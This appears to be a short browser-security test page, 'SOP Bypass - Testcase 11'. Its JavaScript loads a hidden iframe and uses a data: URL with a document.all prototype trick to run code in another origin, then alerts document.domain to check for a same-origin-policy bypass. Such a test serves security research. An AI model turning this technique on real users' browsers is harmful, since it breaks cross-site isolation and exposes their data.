---
layout: default
title: SOP Bypass - Testcase 11
permalink: /sop/new/11
---

# SOP Bypass - Testcase 11

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunc2()">
<script>
function myfunc2() {
    frame = document.body.appendChild(document.createElement("iframe"));
    frame.src = "https://web.archive.org/web/20180831120303/https://www.bing.com";
    frame.width = "0px";
    frame.height = "0px";
    frame.onload = function() {
        frame.onload = null;
        frame.contentWindow[0].location = "data:text/html,<script>(" + function() {
            window.name = "alert";
            obj = document.all;
            obj.__proto__ = parent;
            alert(obj.alert.constructor("return document.domain")());
        } + ")()</script>";
    }
}
</script>

**Note:**
If document.domain points to bing.com, it has resulted in a SOP Bypass.
